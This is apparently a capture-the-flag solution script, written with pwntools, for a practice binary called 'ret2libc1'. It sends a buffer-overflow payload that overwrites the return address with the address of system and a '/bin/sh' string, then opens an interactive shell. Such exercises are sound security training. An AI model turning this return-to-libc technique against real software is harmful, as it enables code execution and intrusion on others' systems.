from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720

system_plt = 0x08048460

payload = b'A' * (0x6c+4) + p32(system_plt) + b'B' * 4 + p32(binsh_addr)
sh.sendline(payload)

sh.interactive()
